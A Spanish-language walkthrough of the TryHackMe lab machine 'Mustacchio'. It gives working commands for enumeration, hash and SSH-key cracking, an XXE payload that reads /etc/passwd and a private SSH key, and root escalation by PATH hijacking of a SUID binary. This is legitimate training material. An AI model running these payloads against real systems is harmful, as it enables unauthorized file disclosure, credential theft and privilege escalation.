# Mustacchio

## 1. Introducción

### 1.1 Antecedentes

La máquina Mustacchio de TryHackMe es un entorno tipo boot2root de dificultad Easy, diseñado para evaluar habilidades en:

- Enumeración de servicios
- Análisis web
- Explotación de vulnerabilidades XML (XXE)
- Escalada de privilegios en sistemas Linux

El escenario presenta múltiples vectores de ataque encadenados, donde el atacante debe descubrir credenciales, explotar una vulnerabilidad web y finalmente abusar de configuraciones inseguras del sistema para obtener acceso root.

### 1.2 Objetivos

- Identificar servicios expuestos en la máquina objetivo
- Enumerar directorios y archivos sensibles en el servidor web
- Obtener credenciales mediante análisis de backups
- Explotar una vulnerabilidad XXE para leer archivos del sistema
- Acceder vía SSH utilizando una clave privada
- Escalar privilegios mediante abuso de binarios SUID
- Obtener las flags de usuario y root

---

## 2. Enumeración

### 2.1 Nmap

Se realizó un escaneo inicial de puertos utilizando Rustscan:

```bash
sudo nmap -p- -Pn -sS -n --min-rate 5000 <ip> -oN allports --open
```

### Resultados:

- 22/tcp → SSH
- 80/tcp → HTTP
- 8765/tcp → HTTP (panel administrativo)

Esto indica la presencia de múltiples servicios web y un posible acceso remoto mediante SSH.

### 2.2 Web

Se inició la enumeración del servicio en el puerto 80 utilizando GoBuster:

```
gobuster dir -u http://<IP> -w /usr/share/dirb/wordlists/common.txt -x txt,php,sh,cgi,html,zip,bak,sql,old
```

#### Hallazgos relevantes:

- Directorio: `/custom/js/`
- Archivo: `users.bak`

#### Análisis de users.bak

Se utilizó:

```
strings users.bak
```

### Resultado:

- Usuario identificado
- Hash de contraseña

El hash fue crackeado, obteniendo credenciales válidas.

### 2.3 Panel administrativo (puerto 8765)

Con las credenciales obtenidas se accede al panel:

- Login exitoso
- Funcionalidad para insertar comentarios

#### Información adicional (código fuente)

En el código fuente del panel:

- Se menciona el usuario: barry
- Referencia a clave SSH
- Archivo: `/auth/dontforget.bak`

#### Análisis de dontforget.bak

El archivo contiene estructura XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
<name>Joe Hamd</name>
<author>Barry Clad</author>
<com>...</com>
</comment>
```

## 3. Explotación

### 3.1 Explotación XXE (XML External Entity)

Se detecta que el sistema procesa XML, por lo que se prueba una vulnerabilidad XXE:

```
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<comment>
<name>Joe</name>
<author>Barry</author>
<com>&example;</com>
</comment>
```

#### Resultado:

El sistema reemplaza la entidad, confirmando la vulnerabilidad XXE.

#### Lectura de archivos del sistema

Se utiliza XXE para leer `/etc/passwd`:

```
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'> ]>
```

#### Resultado:

- Se obtienen usuarios del sistema:
    - barry
    - joe

### 3.2 Extracción de clave SSH

Se accede a:

```
/home/barry/.ssh/id_rsa
```

#### Resultado:

- Se obtiene la clave privada SSH
- La clave está encriptada

#### Cracking de la clave

```
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Se obtiene la passphrase.

### 3.3 Acceso SSH

```
ssh -i id_rsa barry@<IP>
```

- Acceso exitoso
- Obtención de `user.txt`

---

## 4. Post-explotación

### 4.1 Escalada de privilegios mediante SUID + PATH Hijacking

Se enumeran binarios SUID:

```
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

#### Hallazgo clave:

```
/home/joe/live_log
```

---

#### Análisis del binario

```
strings live_log
```

#### Resultado:

```
tail -f /var/log/nginx/access.log
```

El binario ejecuta `tail` con privilegios elevados sin usar una ruta absoluta.

### 4.2 Explotación (PATH Hijacking)

1. Crear un binario falso:

```
echo "/bin/bash" > /tmp/tail
chmod +x /tmp/tail
```

1. Modificar PATH:

```
export PATH=/tmp:$PATH
```

1. Ejecutar el binario:

```
/home/joe/live_log
```

---

### Resultado final

```
id
```

```
uid=0(root)
```

Acceso root conseguido.
